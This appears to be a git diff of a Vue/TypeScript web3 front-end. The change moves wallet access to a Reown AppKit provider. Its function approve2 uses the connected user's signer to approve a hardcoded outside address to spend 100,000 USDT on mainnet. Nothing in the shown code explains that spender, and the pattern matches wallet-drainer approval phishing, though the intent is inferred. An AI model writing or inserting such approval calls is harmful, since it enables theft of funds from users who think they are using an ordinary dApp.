@@ -4,7 +4,7 @@ import { EthersAdapter } from '@reown/appkit-adapter-ethers'
 import { mainnet, arbitrum } from '@reown/appkit/networks'
 import { useWriteContract } from '@wagmi/vue'
 import { abi } from './abi'
-import { BrowserProvider, Contract, ethers, formatUnits } from 'ethers'
+import { BrowserProvider, Contract, Eip1193Provider, ethers, formatUnits } from 'ethers'
 
 const { writeContract } = useWriteContract()
 
@@ -23,18 +23,17 @@ const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 
   async function approve2() {
     const { address, isConnected } = useAppKitAccount()
-    const { walletProvider } = useAppKitProvider('eip155')
+    const { walletProvider } = useAppKitProvider<Eip1193Provider>('eip155')
   try {
-    let provider;
-    let window: any
-    if (typeof window === 'undefined' || !window.ethereum) {
-          alert('Please install   Trust!');
-          provider = ethers.getDefaultProvider()
-        } else {
-          provider = new ethers.BrowserProvider(window.ethereum)
-        }
+    
+    // let window: any
+    // if (typeof window === 'undefined' || !window.ethereum) {
+    //       alert('Please install   Trust!');
+    //       return;
+    //     }
     // const ethersProvider = new ethers.BrowserProvider(window.ethereum)
-    const signer = await provider.getSigner()
+    const ethersProvider = new BrowserProvider(walletProvider)
+    const signer = await ethersProvider.getSigner()
     // The Contract object
     const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
     const USDTBalance = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', BigInt(100000000000) )
